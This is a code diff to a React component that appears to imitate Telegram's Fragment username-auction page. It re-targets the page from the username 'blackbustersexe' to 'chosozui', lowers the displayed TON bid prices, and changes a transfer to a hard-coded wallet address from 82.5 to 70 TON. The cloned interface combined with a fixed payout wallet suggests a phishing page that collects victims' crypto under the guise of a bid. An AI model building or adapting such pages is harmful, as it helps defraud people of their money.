@@ -130,7 +130,7 @@ const AuctionSection: React.FC<AuctionSectionProps> = ({ nickname, showSubscribe
       <h2 className="tm-section-header-text">
         <span className="tm-section-header-domain">
           <span className="tm-web3-address">
-            <span className="subdomain">blackbustersexe</span>
+            <span className="subdomain">chosozui</span>
             <span className="domain">.t.me</span>
           </span>
         </span>
@@ -186,15 +186,15 @@ const BidInfoSection: React.FC<BidInfoSectionProps> = ({ setShowHowItWorksPopup 
         <tr>
           <td>
             <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">1650</div>
-              <div className="table-cell-desc">~ $4416.2 </div>
+              <div className="table-cell-value tm-value icon-before icon-ton">1400</div>
+              <div className="table-cell-desc">~ $3725 </div>
             </div>
             
           </td>
           <td>
           <div className="table-cell table-cell">
-              <div className="table-cell-value tm-value icon-before icon-ton">82.5</div>
-              <div className="table-cell-desc">~ $221</div>
+              <div className="table-cell-value tm-value icon-before icon-ton">70</div>
+              <div className="table-cell-desc">~ $186.4</div>
             </div>
           </td>
         </tr>
@@ -215,19 +215,19 @@ const UsernameInfoSection: React.FC<UsernameInfoSectionProps> = ({ nickname }) =
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Telegram Username</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">@blackbustersexe</span>
+        <span className="accent-color">@chosozui</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">Web Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color">t.me/blackbustersexee</span>
+        <span className="accent-color">t.me/chosozui</span>
       </dd>
     </dl>
     <dl className="tm-list-item">
       <dt className="tm-list-item-title">TON Web 3.0 Address</dt>
       <dd className="tm-list-item-value">
-        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">blackbustersexe</span><span className="domain">.t.me</span></span></span>
+        <span className="accent-color"><span className="tm-web3-address"><span className="subdomain">chosozui</span><span className="domain">.t.me</span></span></span>
       </dd>
     </dl>
   </div>
@@ -250,7 +250,7 @@ const ActionButtons: React.FC<ActionButtonsProps> = ({ nickname, showSubscribe, 
     messages: [
       {
         address: "UQBUTyUtpZuecOGdADIXibnVTJ7GdGeb2sJQGcUPKre2RfoU",
-        amount: "82500000000",
+        amount: "70000000000",
         payload: beginCell().storeUint(0, 32).storeStringTail(comment).endCell().toBoc().toString("base64"),
       },
     ],
